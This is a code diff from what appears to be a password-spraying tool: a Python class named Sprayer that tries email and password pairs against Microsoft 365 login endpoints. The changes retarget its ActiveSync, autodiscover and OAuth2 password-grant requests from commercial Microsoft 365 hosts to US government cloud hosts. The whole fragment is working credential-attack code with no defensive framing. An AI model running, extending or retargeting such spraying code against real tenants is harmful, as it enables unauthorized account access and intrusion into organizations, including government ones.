@@ -125,7 +125,7 @@ class Sprayer:
             time.sleep(0.250)
 
             auth     = HTTPBasicAuth(email, password)
-            url      = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
+            url      = "https://outlook.office365.us/Microsoft-Server-ActiveSync"
             response = self._send_request(requests.options, url, auth=auth, headers=headers)
             status   = response.status_code
 
@@ -166,7 +166,7 @@ class Sprayer:
             time.sleep(0.250)
 
             auth     = HTTPBasicAuth(email, password)
-            url      = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
+            url      = "https://autodiscover-s.office365.us/autodiscover/autodiscover.xml"
             response = self._send_request(requests.get, url, auth=auth)
             status   = response.status_code
 
@@ -250,13 +250,13 @@ class Sprayer:
                 'resource':   'https://graph.windows.net',
                 'client_id':   '1b730954-1685-4b74-9bfd-dac224a7b894',
                 'client_info': '1',
-                'grant_type':  'password', 
+                'grant_type':  'password',
                 'username':    email,  # TODO: Do we want username or email here...
                 'password':    password,
                 'scope':       'openid'
             }
 
-            url      = "https://login.microsoft.com/common/oauth2/token"        
+            url      = "https://login.microsoftonline.us/common/oauth2/token"
             response = self._send_request(requests.post, url, data=data, headers=headers)
             status   = response.status_code
 
